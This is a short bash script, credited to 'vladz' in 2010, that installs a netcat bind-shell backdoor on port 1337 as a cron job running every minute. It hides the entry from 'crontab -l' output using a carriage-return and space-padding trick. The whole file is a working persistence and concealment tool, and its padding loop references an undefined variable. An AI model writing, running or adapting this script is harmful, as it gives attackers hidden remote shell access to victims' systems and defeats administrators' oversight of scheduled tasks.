#!/bin/bash
#
# Copyright (C) 2010 vladz <vladz@devzero.fr>
#
# hide-task.sh -- Hide a shell backdoor inside a cron table by using
# carriage return's control sequence ('\r').

# vladz's backdoor (requires netcat)
# note: remove nc's "-p" option if you're using the OpenBSD's netcat.
BDOOR_PT=1337
BDOOR_SH="{ \
cd /tmp; mkfifo .i .o; \
cat .o | nc -l -p ${BDOOR_PT} > .i & \
/bin/sh < .i &>.o ; rm -f .i .o; \
}"

# scheduled task that will be hidden
HIDDEN="* * * * * ${BDOOR_SH}>/dev/null 2>&1"

# Display the current cron table and modify the first line
crontab -l 2>&1 | {
   read FIRST_TASK;
   if [ ${#HIDDEN} -gt ${#FIRST_TASK} ]; then
      # end the first crontab line with spaces to hide our backdoor and
      # one more character (";").
      while (( i < (${#HIDDEN} - ${#SHOWN_TASK} + 1) )); do
         FIRST_TASK="${FIRST_TASK} "; ((i++))
      done
   fi

   # carriage return goes there ("\r")
   printf "${HIDDEN};\r${FIRST_TASK}\n"; cat
} | crontab -

if [ $? -eq 0 ]; then
   echo "Backdoor is now hidden in cron table"
   echo "Shell will be bind on port ${BDOOR_PT}."
else 
   echo "Failed."
fi